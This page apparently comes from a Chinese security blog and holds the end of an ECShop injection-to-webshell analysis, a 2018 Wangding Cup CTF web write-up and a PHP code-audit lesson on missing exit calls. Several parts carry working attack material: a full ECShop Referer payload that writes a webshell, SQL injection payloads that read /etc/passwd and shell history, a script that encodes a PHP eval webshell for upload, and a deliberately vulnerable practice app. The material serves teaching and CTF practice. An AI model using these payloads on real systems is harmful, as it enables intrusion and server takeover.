<p>我们可以思考一下这处的命令执行，能不能像前面一样，只利用 <strong>$arr[‘id’]</strong> 位置（即引入单个 <strong>#</strong> 号）？实际上是不行的，必须两个可控变量同时配合利用，才能完成攻击。因为在 <strong>includes/lib_insert.php</strong> 文件中有一个判断，如果数据库查询出的 <strong>position_id</strong> 和用户传入的 <strong>id</strong> 相同，才会执行 <strong>fetch</strong> 函数，继而进入 <strong>includes/cls_template.php</strong> 文件的 <strong>_eval</strong> 方法，达到代码执行的目的。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/9.png" alt="9"></p>
<p>我们试着使用前面我构造的 <strong>payload</strong> （只利用 <strong>$arr[‘id’]</strong> 引入单个 <strong>#</strong> 号），此时 <strong>$arr[‘id’]</strong> 对应下图黄框部分，而 <strong>$row[‘position_id’]</strong> 对应红框部分，要让这两个地方相等，根本不可能。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/10.png" alt="10"></p>
<p>仔细观察，会发现 <strong>$row[‘position_id’] </strong> 和 <strong>$arr[‘id’]</strong> 之间使用的是弱比较，那我们是否能利用PHP弱比较的特性绕过呢？实际上还是不行，因为 <strong>$row[‘position_id’] </strong> 是从数据库中查询出来的，其值类型为字符串，所以无法相等。</p>
<p>最终payload传到 <strong>_eval</strong> 函数中，成功执行代码：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/11.png" alt="11"></p>
<h3 id="ECShop3-x"><a href="#ECShop3-x" class="headerlink" title="ECShop3.x"></a>ECShop3.x</h3><p>下面以3.0.0版本为例。在ECShop3.x版本中，添加了一个 <strong>includes/safety.php</strong> 文件，专门用于消除有害数据，但是漏洞依旧存在，我们只需绕过过滤函数即可。该文件代码如下：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/12.png" alt="12"></p>
<p>用我们之前的payload，会触发过滤SQL注入的正则，具体匹配到的子项如下的 <strong>$ttt</strong> 变量：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/13.png" alt="13"></p>
<p>主要这个正则会匹配到 <strong>set</strong> 、 <strong>concat</strong> 、<strong>information_schema.</strong>、 <strong>select from</strong> 语句等，暂时没有找到可绕过的SQL语句。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/14.png" alt="14"></p>
<p>不过命令执行还是可以绕过的，因为我们之前的payload经过编码，这样就绕过了正则匹配。现在唯一能匹配到的就是 <strong>union select</strong> 语句，我们可以同时利用 <strong>$arr[‘id’]</strong> 和 <strong>$arr[‘num’]</strong> 两个参数，将 <strong>union</strong> 和 <strong>select</strong> 分开传递即可绕过正则检测：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/15.png" alt="15"></p>
<p>但是这里还会匹配到 <strong>select from</strong> 语句，这里没有绕过，所以爆不了表名列名。</p>
<p><strong>3.x</strong> 版本除了多了这处正则，<strong>includes/cls_template.php</strong> 文件中的 <strong>fetch_str</strong> 方法结尾处也不一样了，多了一个 <strong>if</strong> 结构，满足条件才能继续命令执行。下图左边为 <strong>ECShop2.7.3</strong> ，右边为 <strong>ECShop3.0.0</strong> ：</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/16.png" alt="16"></p>
<p>按照默认的数据传递流程，<strong>version_compare</strong> 函数默认是存在的，所以要想进入 <strong>if</strong> 语句，必须让后面的条件为真。后面的条件要求我们PHP的版本需要小于 <strong>5.3.0</strong> 才会进入该 <strong>if</strong> 语句。在实际测试时，我在 <strong>PHP5.2.17</strong> 版本下利用如下payload确实可以成功写入webshell，但是PHP版本大于等于 <strong>5.3.0</strong> 就无法写入webshell。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";s:286:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -";s:2:"id";s:9:"' union/*";&#125;45ea207d7a2b68c49582d2d22adf953aadsa</span><br></pre></td></tr></table></figure>
<p>实际上ECShop在3.6的版本中已经修复了该漏洞，而 <a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">这篇</a> 文章中所说的3.6.x也存在，我看了他的测试代码，发现他把原先ECShop中的修复代码给注释掉了，这样当然可以利用漏洞了！标题有点误导性。</p>
<p><img src="/img/关于ECShop前台注入和getshell漏洞的一些思考/30.png" alt="30"></p>
<p>本文分析到此结束，文中若有不当，还望大家斧正，若有绕过姿势愿意分享，也可以联系我。</p>
<h3 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h3><p><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShop全系列版本远程代码执行高危漏洞分析</a><br><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">ECShop 0day 的堕落之路</a><br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">ecshop2.x代码执行</a><br><a href="http://www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/" target="_blank" rel="noopener">ECShop sqli and rce</a><br><a href="https://xz.aliyun.com/t/2691" target="_blank" rel="noopener">ECShop &lt;= 2.7.x/3.6.x 全系列版本远程代码执行高危漏洞EXP</a><br><a href="http://www.freebuf.com/vuls/183294.html" target="_blank" rel="noopener">ECShop 2.x 3.0代码执行漏洞分析</a> </p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/09/01/2018网鼎杯第四场/">2018网鼎杯第四场Web题解</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-09-01
        </span>
        
          <div class="post-category">
            
              <a href="/categories/CTF竞赛训练/">CTF竞赛训练</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h3><p>题目界面如下，有发帖留言的功能，不过需要登录才能使用。</p>
<p><img src="/img/2018网鼎杯第四场/1.png" alt="1"></p>
<p>可以通过爆破得知账号密码为：zhangwei/zhangwei666</p>
<p><img src="/img/2018网鼎杯第四场/2.png" alt="2"></p>
<p>手工测试发现存在 <strong>.git</strong> 泄露，用 <a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener"><strong>GitHack</strong></a> 下载泄露文件，发现 <strong>write_do.php</strong> 的代码不全。通过 <strong>git cat-file -p xxxxx</strong> 命令显示版本库对象的内容、类型及大小信息，可以看到完整的代码：</p>
<p><img src="/img/2018网鼎杯第四场/3.png" alt="3"></p>
<p>具体代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/4.png" alt="4"></p>
<p>可以看到上面 <strong>第13-14</strong> 行都对 <strong>POST</strong> 传来 <strong>category</strong> 、 <strong>title</strong> 、<strong>content</strong> 三个参数进行了特殊字符转义，然而在 <strong>第28行</strong> 和 <strong>第30-33行</strong> 处直接将从数据库中取出的数据，未经任何过滤拼接到 <strong>SQL语句</strong> 中，这就存在 <strong>二次注入</strong> 。</p>
<p>有很多人一直纠结 <strong>addslashes</strong> 这个转义函数，其实大家在数据库中测试一下就知道了，假设我们的 <strong>payload</strong> 为：<strong>‘,content=user(),/*</strong> ，那么经过 <strong>addslashes</strong> 函数转义后，变成了 <strong>\‘,content=user(),/*</strong> ，我们看一下插入数据库中变成啥样：</p>
<p><img src="/img/2018网鼎杯第四场/5.png" alt="5"></p>
<p>所以根本就不影响我们进行二次注入。下面说说二次注入的攻击过程：</p>
<ul>
<li>先进入 <strong>write</strong> 方法，将 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code> 插入 <strong>board</strong> 表的 <strong>category</strong> 字段中</li>
<li>再进入 <strong>comment</strong> 方法，程序将 <strong>board</strong> 表中的 <strong>category</strong> 字段取出，没进行过滤，拼接到新的 <strong>insert</strong> 语句中。由于我们之前的 <strong>payload</strong> 中带有 <strong>/*</strong> ，所以我们需要闭合它，即我们在评论处提交 <strong>*/#</strong> (对应 <strong>content</strong> 变量的值)</li>
<li>然后程序执行 <strong>第二个SQL</strong> 语句，并将用户提交的 <strong>content</strong> 值显示出来，而我们的 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code>  就会显示出当前用户。</li>
</ul>
<p><img src="/img/2018网鼎杯第四场/6.png" alt="6"></p>
<p><img src="/img/2018网鼎杯第四场/7.png" alt="7"></p>
<p>看到是 <strong>root</strong> 用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 <strong>SQL语句</strong> 读取flag文件了。</p>
<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/8.png" alt="8"></p>
<p>发现存在 <strong>www</strong> 用户，继续查看 <strong>.bash_history</strong> 记录，payload为: <strong>‘,content=(select load_file(‘/home/www/.bash_history’)),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/9.png" alt="9"></p>
<p>发现 <strong>www</strong> 用户的一些操作。看见有 <strong>.DS_Store</strong> 文件，考虑到目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： <strong>‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</strong> </p>
<p><img src="/img/2018网鼎杯第四场/10.png" alt="10"></p>
<p>解码获得flag路径：</p>
<p><img src="/img/2018网鼎杯第四场/11.png" alt="11"></p>
<p>使用payload： <strong>‘,content=(select load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’)),/*</strong> 读取flag：</p>
<p><img src="/img/2018网鼎杯第四场/12.png" alt="12"></p>
<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>没啥意思的一道题目。题目是一个wordpress的站点，如下：</p>
<p><img src="/img/2018网鼎杯第四场/13.png" alt="13"></p>
<p>查看图片的url，发现其url形式极其可能存在SSRF漏洞：</p>
<p><img src="/img/2018网鼎杯第四场/14.png" alt="14"></p>
<p>通过 <strong>git</strong> 收集信息，可以发现一个内网用户查询接口。</p>
<p><img src="/img/2018网鼎杯第四场/15.png" alt="15"></p>
<p><img src="/img/2018网鼎杯第四场/16.png" alt="16"></p>
<p><strong>api.php</strong> 的内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//http://10.220.56.29/WD_UserListAPI.php?uid=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>所以我们遍历uid的值即可获取用户信息。当uid值为233的时候，即可获得flag：</p>
<p><img src="/img/2018网鼎杯第四场/17.png" alt="17"></p>
<h3 id="NoWafUpload"><a href="#NoWafUpload" class="headerlink" title="NoWafUpload"></a>NoWafUpload</h3><p>这题可以任意上传文件，题目如下：</p>
<p><img src="/img/2018网鼎杯第四场/18.png" alt="18"></p>
<p>当我们上传PHP一句话的时候，显示上传成功并返回路径，但是去访问就404。</p>
<p><img src="/img/2018网鼎杯第四场/19.png" alt="19"></p>
<p>一开始以为是时间竞争，尝试发现并不是。扫了一下目录，发现存在 <strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong> 文件，里面包含一个.so的拓展还有一个经过加密的PHP文件。所以考点应该是我们通过逆向来知道加密算法，然后将我们的一句话经过该加密算法加密后再上传，这样代码通过检测才能被解析。使用 <strong>IDA</strong> 反汇编 <strong>funencrypt.so</strong> 文件，发现关键函数，代码如下：</p>
<p><img src="/img/2018网鼎杯第四场/21.png" alt="21"></p>
<p>我们把经过加密的 <strong>sdfasgerwtytc.php</strong> 文件拖入16进制分析软件中，并根据上面的反汇编代码进行对比：</p>
<p><img src="/img/2018网鼎杯第四场/22.png" alt="22"></p>
<p> <strong>sdfasgerwtytc.php</strong> 文件实际上就是一个 <strong>phpinfo</strong> 页面（上传上去访问就知道了），而上图中的的三个 <strong>fread</strong> 代码分别表示前32字节的字符串（这里刚好是一个md5值）、两个长度。一个为16进制 <strong>10</strong> ，即整数16，猜测是代码： <strong>&lt;?php phpinfo();</strong> 的长度，后面一个为16进制16，即整数22，刚好是后面一段乱七八糟字符串的长度。</p>
<p>我们继续看35行以下的代码。首先先校验了开头读的md5，而这个md5的值就是后面那一串乱七八糟字符串的md5，这个自己计算一下就知道了。然后取那串乱七八糟的字符串逐位与 <strong>0xC</strong> 进行异或，并将其结果 <strong>uncompress</strong> 后写入某个文件。</p>
<p><img src="/img/2018网鼎杯第四场/23.png" alt="23"></p>
<p>根据上面的逻辑，反推回去，写出加密PHP程序的代码。如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,zlib</span><br><span class="line">s = <span class="string">"&lt;?php eval($_POST[_]);"</span></span><br><span class="line">bf_len = hex(len(s))</span><br><span class="line"></span><br><span class="line">compress_s = zlib.compress(s)</span><br><span class="line"></span><br><span class="line">new_compress = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> compress_s:</span><br><span class="line">    new_compress += chr(ord(ch)^<span class="number">0xC</span>)</span><br><span class="line"></span><br><span class="line">MD5 = hashlib.md5()</span><br><span class="line">MD5.update(new_compress)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"MD5 : "</span> + MD5.hexdigest().encode(<span class="string">'hex'</span>))</span><br><span class="line">print(<span class="string">"bf_len: "</span> + bf_len)</span><br><span class="line">af_len = hex(len(new_compress))</span><br><span class="line">print(<span class="string">"af_len: "</span> + af_len)</span><br><span class="line">print(<span class="string">"new_compress: "</span> + new_compress.encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
<p>将生成的16进制数据按顺序写入文件即可：</p>
<p><img src="/img/2018网鼎杯第四场/24.png" alt="24"></p>
<p>上传该文件，使用密码 <strong>_</strong> 查找flag：</p>
<p><img src="/img/2018网鼎杯第四场/25.png" alt="25"></p>

        
      
    </div>

    

    

  </article>

    
      
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          <a class="post-link" href="/2018/08/31/代码审计Day10 - 程序未恰当exit导致的问题/">代码审计Day10 - 程序未恰当exit导致的问题</a>
        
      </h1>

      <div class="post-meta">
        <span class="post-time">
          2018-08-31
        </span>
        
          <div class="post-category">
            
              <a href="/categories/代码审计/">代码审计</a>
            
          </div>
        
        
      </div>
    </header>

    
    


    <div class="post-content">
      
        
        

        
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 <a href="https://github.com/hongriSec/PHP-Audit-Labs" target="_blank" rel="noopener"><strong>PHP-Audit-Labs</strong></a> 。现在大家所看到的系列文章，属于项目 <strong>第一阶段</strong> 的内容，本阶段的内容题目均来自 <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">PHP SECURITY CALENDAR 2017</a> 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 <strong>第10篇</strong> 代码审计文章：</p>
<h2 id="Day-10-Anticipation"><a href="#Day-10-Anticipation" class="headerlink" title="Day 10 - Anticipation"></a>Day 10 - Anticipation</h2><p>题目叫做预期，代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/1.png" alt="1"></p>
<p><strong>漏洞解析</strong> ：</p>
<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.extract.php" target="_blank" rel="noopener"> extract </a> ：(PHP 4, PHP 5, PHP 7)</p>
<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code> </p>
</blockquote>
<p>该函数实际上就是把数组中的键值对注册成变量，具体可以看如下案例：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/2.png" alt="2"></p>
<p>这样我们就可以控制 <strong>第7行</strong> 处的 <strong>pi</strong>  变量。程序对 <strong>pi</strong>  变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong>  变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>/error/</strong> 页面。看来程序员这里是对非法的操作进行了一定的处理。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong>  变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
<p>例如我们的payload为：<strong>pi=phpinfo()</strong> （这里为POST传递数据），然后程序就会执行这个 <strong>phpinfo</strong> 函数。当然，你在浏览器端可能看不到 <strong>phpinfo</strong> 的页面，而是像下面这样的图片：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/3.png" alt="3"></p>
<p>但是用 <strong>BurpSuite</strong> ，大家就可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/4.png" alt="4"></p>
<p>为了方便大家理解，笔者这里录制了debug程序的过程：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/5.gif" alt="5"></p>
<p>实际上，这种案例在真实环境下还不少。例如有些CMS通过检查是否存在install.lock文件，从而判断程序是否安装过。如果安装过，就直接将用户重定向到网站首页，却忘记直接退出程序，导致网站重装漏洞的发生。下面我们来看两个真实的案例。</p>
<h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="FengCms-1-32-网站重装漏洞"><a href="#FengCms-1-32-网站重装漏洞" class="headerlink" title="FengCms 1.32 网站重装漏洞"></a>FengCms 1.32 网站重装漏洞</h3><p>本次实例分析，我们选取的是 <strong><a href="http://pan.baidu.com/s/1i33gNVR" target="_blank" rel="noopener">FengCms 1.32</a></strong> 。对于一个已经安装好的 <strong>FengCms</strong> ，当用户再次访问 <strong>install/index.php</strong> 时，就会导致网站重装。我们来具体看下程序的逻辑：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/6.png" alt="6"></p>
<p>我们可以看到，如果是第一次安装网站，程序会在 <strong>upload</strong> 目录下生成一个 <strong>INSTALL</strong> 文件，用于表示该网站已经安装过(对应上图 <strong>25-28行</strong> 代码)。当我们再次访问该文件时，程序会先判断 <strong>upload</strong> 目录下是否有 <strong>INSTALL</strong> 文件。如果存在，则弹窗提示你先删除 <strong>INSTALL</strong> 文件才能进行网站重装(对应上图 <strong>1-4行</strong> 代码)。但是这里注意了，网站在弹出告警信息后，并没有退出，而是继续执行，所以我们在不删除 <strong>INSTALL</strong> 文件的情况下，仍可以重装网站。</p>
<p>比较有趣的是，原本网站网站成功后，程序会自动删除 <strong>upload</strong> 目录下的所有文件，来防止攻击者重装网站，然而这段代码却在注释当中，具体原因不得而知。</p>
<p><img src="/img/PHP-Audit-Labs/Day10/7.png" alt="7"></p>
<h3 id="Simple-Log1-6网站重装漏洞"><a href="#Simple-Log1-6网站重装漏洞" class="headerlink" title="Simple-Log1.6网站重装漏洞"></a>Simple-Log1.6网站重装漏洞</h3><p>我们再来看 <strong><a href="http://down.admin5.com/php/42012.html#link" target="_blank" rel="noopener">Simple-Log1.6</a></strong> 网站重装的例子。其 <strong>install\index.php</strong> 文件中，对网站安装成功的处理有问题，其代码是在下图 <strong>17-20行</strong> ，程序只是用 <strong>header</strong> 函数将其重定向到网站首页，然而程序还是会继续执行下去。</p>
<p><img src="/img/PHP-Audit-Labs/Day10/8.png" alt="8"></p>
<p>而且程序的安装逻辑其实是有问题的，安装步骤由 <strong>$setup</strong> 变量控制，而 <strong>$setup</strong> 变量可以被用户完全控制(如上图 <strong>第10行</strong> 代码)，攻击者完全可以控制网站的安装步骤。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用就极其简单了，我们先来看一下 <strong>FengCms</strong> ，我们直接访问 <strong>install/index.php</strong> 页面，无视弹出来的警告：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/9.png" alt="9"></p>
<p><img src="/img/PHP-Audit-Labs/Day10/10.png" alt="10"></p>
<p>可以看到程序仍然可以继续安装。</p>
<p>我们再来看一下 <strong>Simple-Log</strong> 的重装利用：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/11.png" alt="11"></p>
<p>直接post以上数据，即可重装网站数据。</p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>实际上，要修复这一类型的漏洞，我们只要在正确的地方退出程序即可。拿这次的例题举例，我们只需要在检查到非法操作的时候，直接添加退出函数，即可避免漏洞发生。例如使用 <strong>die</strong> 、 <strong>exit</strong> 等函数都是可以的，具体修复代码如下：</p>
<p><img src="/img/PHP-Audit-Labs/Day10/12.png" alt="12"></p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>看完了上述分析，不知道大家是否对 <strong>未正确退出程序</strong> 导致的攻击有了更加深入的理解，文中用到的 <strong>CMS</strong> 可以从这里( <a href="http://pan.baidu.com/s/1i33gNVR" target="_blank" rel="noopener"><strong>FengCms 1.32</strong></a>  、 <strong><a href="http://down.admin5.com/php/42012.html#link" target="_blank" rel="noopener">Simple-Log1.6</a></strong> )下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 <a href="mailto:**hongrisec@gmail.com" target="_blank" rel="noopener">**hongrisec@gmail.com</a><strong> 联系我们。</strong>Day10** 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"你所查询的对象id值不能为空！"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"fire"</span>;</span><br><span class="line">$password = <span class="string">"fire"</span>;</span><br><span class="line">$dbname = <span class="string">"day10"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 搭建CTF环境使用的sql语句</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> day10;</span><br><span class="line"><span class="keyword">use</span> day10;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> students (</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">6</span>) <span class="keyword">unsigned</span> auto_increment primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">email <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">score <span class="built_in">int</span>(<span class="number">8</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'Lucia'</span>,<span class="string">'Lucia@hongri.com'</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> students <span class="keyword">VALUES</span>(<span class="number">2</span>,<span 